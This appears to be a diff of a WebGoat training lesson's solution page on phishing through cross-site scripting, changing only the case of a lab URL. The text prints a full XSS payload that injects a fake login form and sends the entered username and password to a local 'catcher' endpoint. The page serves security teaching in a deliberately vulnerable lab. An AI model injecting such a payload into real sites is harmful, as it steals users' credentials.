@@ -18,7 +18,7 @@ hard for a victim to determinate that the content is malicious.
 <p><b>General Goal(s):</b><br/>
 The user should be able to add a form asking for username 
 and password. On submit the input should be sent to 
-http://localhost/webgoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
+http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
 </p>
 
 <b>Solution:</b><br/>
@@ -38,7 +38,7 @@ name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
 </p>
 Now you need a script:
 <p>
-&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/webgoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
 document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
 User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
 &lt;/script&gt;
@@ -53,7 +53,7 @@ calls the script. You can reach this with the onclick="myFunction()" handler:
 &lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;
 <p>
 The final String looks like this:<br/>
-&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/webgoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
 document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
 User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
 &lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
